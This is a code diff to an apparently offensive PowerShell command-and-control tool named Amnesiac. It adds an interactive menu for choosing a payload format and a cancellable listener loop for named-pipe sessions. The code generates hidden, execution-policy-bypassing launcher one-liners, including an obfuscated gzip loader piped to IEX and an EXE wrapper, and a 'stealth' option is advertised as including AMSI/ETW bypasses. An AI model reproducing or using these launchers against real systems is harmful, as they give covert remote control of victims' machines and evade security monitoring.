@@ -1771,15 +1771,39 @@ function New-StealthScript {
 	}
 }
 
+function Show-PayloadMenu {
+	Write-Output ""
+	Write-Host " Select payload format:" -Foreground cyan
+	Write-Output ""
+	Write-Output "  [1] b64     — base64 encoded one-liner (most compatible)"
+	Write-Output "  [2] gzip    — gzip+base64 compressed, shorter footprint"
+	Write-Output "  [3] stealth — gzip+obfuscated, includes AMSI/ETW/SBL bypasses"
+	Write-Output "  [4] raw     — inline PowerShell, no encoding"
+	Write-Output "  [5] pwsh    — Start-Process launcher, spawns hidden PS process"
+	Write-Output ""
+	Write-Host " Choice [1-5]: " -Foreground yellow -NoNewline
+	$c = Read-Host
+	switch ($c.Trim()) {
+		'1' { return 'b64' }
+		'2' { return 'gzip' }
+		'3' { return 'stealth' }
+		'4' { return 'pwraw' }
+		'5' { return 'pwsh' }
+		default { return 'b64' }
+	}
+}
+
 function Start-Listener {
-	
+
 	param (
         [string]$SinglePipeName,
 		[switch]$HidePayload
     )
-	
+
     # Load necessary .NET assemblies
 	Add-Type -AssemblyName System.Core
+
+	$chosenFormat = if($HidePayload){ $global:payloadformat } else { Show-PayloadMenu }
 
 	if(!$SinglePipeName){
 		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
@@ -1827,7 +1851,7 @@ while (`$true) {
 	$b64ClientScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScript))
 	
 	if(!$HidePayload){
-		if($global:payloadformat -eq 'exe'){
+		if($chosenFormat -eq 'exe'){
 			$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($PipeName).exe"
    			Write-Output ""
 			Write-Host " [+] Payload saved to: $exefilelocation" -Foreground cyan
@@ -1838,25 +1862,25 @@ while (`$true) {
 			Write-Host " [+] Payload:" -Foreground cyan
 			Write-Output ""
 		}
-		if($global:payloadformat -eq 'b64'){
+		if($chosenFormat -eq 'b64'){
 			Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
 			Write-Output ""
 		}
-		elseif($global:payloadformat -eq 'raw'){
+		elseif($chosenFormat -eq 'raw'){
 			Write-Output " cmd /c powershell -windows hidden `"$RawClientScript`" & exit"
 			Write-Output ""
 		}
-		elseif($global:payloadformat -eq 'pwraw'){
+		elseif($chosenFormat -eq 'pwraw'){
 			Write-Output " $PwshRawClientScript"
 			Write-Output ""
 		}
-		elseif($global:payloadformat -eq 'pwsh'){
+		elseif($chosenFormat -eq 'pwsh'){
 			$ClientScriptEdit = $ClientScript += ";exit"
 			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
 			Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 			Write-Output ""
 		}
-  		elseif($global:payloadformat -eq 'gzip'){
+  		elseif($chosenFormat -eq 'gzip'){
 			$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawClientScript)
 			$memoryStream = [System.IO.MemoryStream]::new()
 			$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
@@ -1869,13 +1893,13 @@ while (`$true) {
 			Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
 			Write-Output ""
 		}
-  		elseif($global:payloadformat -eq 'exe'){
+  		elseif($chosenFormat -eq 'exe'){
 			$ClientScriptEdit = $ClientScript += ";exit"
 			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
 			$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 			PS1ToEXE -content $exescript -outputFile $exefilelocation
 		}
-		elseif($global:payloadformat -eq 'stealth'){
+		elseif($chosenFormat -eq 'stealth'){
 			$built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
 			$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
 			Write-Output " [Inline PS — paste into existing session]"
@@ -1895,15 +1919,31 @@ while (`$true) {
 
 	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', $global:BufferSize, $global:BufferSize, $securityDescriptor)
 	
-	$psScript = "Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`".`", `"$pipeName`", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"dummyhostdropconnection,`$(Get-Location)`"); `$sw.Flush(); `$dummyPipeClient.Close()"
-	
-	$b64psScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psScript))
-	
-	Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64psScript" -WindowStyle Hidden
-		
-	Write-Host " [*] Waiting for connection... [30 seconds timeout]" -Foreground yellow
- 	
-  	$pipeServer.WaitForConnection()
+	Write-Output ""
+	Write-Host " [*] Waiting for connection... (Q to cancel)" -Foreground yellow
+	$Host.UI.RawUI.FlushInputBuffer()
+	$_waitTask = $pipeServer.WaitForConnectionAsync()
+	$_cancelled = $false
+	while (-not $_waitTask.IsCompleted) {
+		if ($Host.UI.RawUI.KeyAvailable) {
+			$_key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+			if ($_key.Character -in 'q','Q') {
+				$_cancelled = $true
+				try {
+					$_d = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pipeName, 'InOut')
+					$_d.Connect(1000)
+					$_dw = New-Object System.IO.StreamWriter($_d)
+					$_dw.WriteLine("__CANCELLED__,,")
+					$_dw.Flush()
+					Start-Sleep -Milliseconds 100
+					$_d.Dispose()
+				} catch {}
+				break
+			}
+		}
+		Start-Sleep -Milliseconds 150
+	}
+	if (-not $_waitTask.IsCompleted) { [void]$_waitTask.Wait(2000) }
 
 	$sr = New-Object System.IO.StreamReader($pipeServer)
 	$sw = New-Object System.IO.StreamWriter($pipeServer)
@@ -1913,13 +1953,13 @@ while (`$true) {
 	$computerNameOnly = $initialInfo[0]
 	$remotePath = $initialInfo[1]
 	$UserIdentity = $initialInfo[2]
-	
-	if ($computerNameOnly -eq 'dummyhostdropconnection') {
+
+	if ($_cancelled -or $computerNameOnly -eq 'dummyhostdropconnection' -or $computerNameOnly -eq '__CANCELLED__') {
 		$global:Message = " [-] No connection was established"
 		#Write-Output "[-] No connection was established. Returning to previous menu..."
-		
+
 		# Close resources related to this pipe and return to the previous menu.
-		
+
 		# Ensure StreamWriter is not closed and then close it
 		if ($sw) {
 			$sw.Close()
@@ -1955,6 +1995,9 @@ while (`$true) {
 	#Write-Output "[+] New session established [$computerNameOnly]"
 	$global:Message = " [+] New session established [$computerNameOnly]"
 	#Write-Output ""
+
+	# Auto-enter the session immediately
+	InteractWithPipeSession -PipeServer $pipeServer -StreamWriter $sw -StreamReader $sr -computerNameOnly $computerNameOnly -PipeName $PipeName
 }
 
 function Print-MultiListener {
@@ -1962,6 +2005,8 @@ function Print-MultiListener {
 	
 	# Load necessary .NET assemblies
 	Add-Type -AssemblyName System.Core
+
+	$chosenFormat = Show-PayloadMenu
 
 	$PN = $global:MultiPipeName
 	$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
@@ -2018,7 +2063,7 @@ while (`$true) {
 	Write-Output ""
 	Write-Host " [+] Global-Listener PipeName: $global:MultiPipeName" -Foreground yellow
 	Write-Output ""
-	if($global:payloadformat -eq 'exe'){
+	if($chosenFormat -eq 'exe'){
 		$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($global:MultiPipeName).exe"
 		Write-Host " [+] Payload saved to: $exefilelocation" -Foreground cyan
 		Write-Output ""
@@ -2027,25 +2072,25 @@ while (`$true) {
 		Write-Host " [+] Payload:" -Foreground cyan
 		Write-Output ""
 	}
-	if($global:payloadformat -eq 'b64'){
+	if($chosenFormat -eq 'b64'){
 		Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
 		Write-Output ""
 	}
-	elseif($global:payloadformat -eq 'raw'){
+	elseif($chosenFormat -eq 'raw'){
 		Write-Output " cmd /c powershell -windowst hidden `"$RawServerScript`" & exit"
 		Write-Output ""
 	}
-	elseif($global:payloadformat -eq 'pwraw'){
+	elseif($chosenFormat -eq 'pwraw'){
 		Write-Output " $PwshRawServerScript"
 		Write-Output ""
 	}
-	elseif($global:payloadformat -eq 'pwsh'){
+	elseif($chosenFormat -eq 'pwsh'){
 		$ServerScriptEdit = $ServerScript += ";exit"
 		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
 		Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 		Write-Output ""
 	}
- 	elseif($global:payloadformat -eq 'gzip'){
+ 	elseif($chosenFormat -eq 'gzip'){
 		$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawServerScript)
 		$memoryStream = [System.IO.MemoryStream]::new()
 		$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
@@ -2058,13 +2103,13 @@ while (`$true) {
 		Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
 		Write-Output ""
 	}
-	elseif($global:payloadformat -eq 'exe'){
+	elseif($chosenFormat -eq 'exe'){
 		$ServerScriptEdit = $ServerScript += ";exit"
 		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
 		$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 		PS1ToEXE -content $exescript -outputFile $exefilelocation
 	}
-	elseif($global:payloadformat -eq 'stealth'){
+	elseif($chosenFormat -eq 'stealth'){
 		$stealthSID = if($global:Detach){'S-1-1-0'} else {$SID}
 		$built = New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID
 		$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
@@ -2076,7 +2121,30 @@ while (`$true) {
 		Write-Output ""
 	}
 
-	if(!$NoWait){Start-Sleep 4}
+	if (!$NoWait) {
+		Write-Output ""
+		Write-Host " [*] Listening for sessions... (Q to stop)" -Foreground yellow
+		$Host.UI.RawUI.FlushInputBuffer()
+		$_prevCount = $global:MultipleSessions.Count
+		while ($true) {
+			if ($Host.UI.RawUI.KeyAvailable) {
+				$_k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+				if ($_k.Character -in 'q','Q') { break }
+			}
+			$_before = $global:MultipleSessions.Count
+			Scan-WaitingTargets
+			if ($global:MultipleSessions.Count -gt $_before) {
+				for ($_i = $_before; $_i -lt $global:MultipleSessions.Count; $_i++) {
+					$_s = $global:MultipleSessions[$_i]
+					Write-Host " [+] Session received: $($_s.ComputerName) [$($_s.UserID)]" -Foreground green
+				}
+			}
+			Start-Sleep -Milliseconds 500
+		}
+		$_total = $global:MultipleSessions.Count - $_prevCount
+		Write-Host " [*] Stopped. $_total new session(s) collected." -Foreground yellow
+		Write-Output ""
+	}
 }
 
 function Scan-WaitingTargets{
